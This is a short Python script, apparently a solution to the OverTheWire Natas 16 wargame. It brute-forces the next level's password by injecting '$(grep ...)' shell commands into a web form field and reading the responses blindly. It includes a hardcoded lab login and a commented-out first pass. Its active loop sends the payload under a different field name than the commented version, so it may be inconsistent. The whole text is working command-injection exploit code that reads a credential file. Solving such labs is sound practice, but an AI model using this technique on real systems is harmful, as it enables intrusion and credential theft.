#lol$(grep A /etc/natas_webpass/natas17)

import requests
from requests.auth import HTTPBasicAuth

url = "http://natas16.natas.labs.overthewire.org/index.php"
l = ""
c = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

# for i in range(len(c)):
# 	u = "%" + c[i] + "%"
# 	u = 'lol$(grep ' + c[i] + ' /etc/natas_webpass/natas17)'
# 	data = {"needle": u}
# 	r = requests.post(url, auth=HTTPBasicAuth("natas16", "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"), data=data)
# 	assert(r.status_code == 200)
# 	if 'lol' not in r.text:
# 		l += c[i]
# 		print(u)

# print(l)
####
l = "bcdghkmnqrswAGHNPQSW035789"

p = ""
for i in range(32):
	for i in range(len(l)):
		#lol$(grep -E ^a)
		u = 'lol$(grep -E ^' + p + l[i] + ' /etc/natas_webpass/natas17)'
		data = {"username": u}
		r = requests.post(url, auth=HTTPBasicAuth("natas16", "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"), data=data)
		assert(r.status_code == 200)
		if 'lol' not in r.text:
			p += l[i]
			print(r.text)
			#print(u)
			print(">>>" + u)
			break

# print(p)
# print(type(r))
# print(r)
# print(l)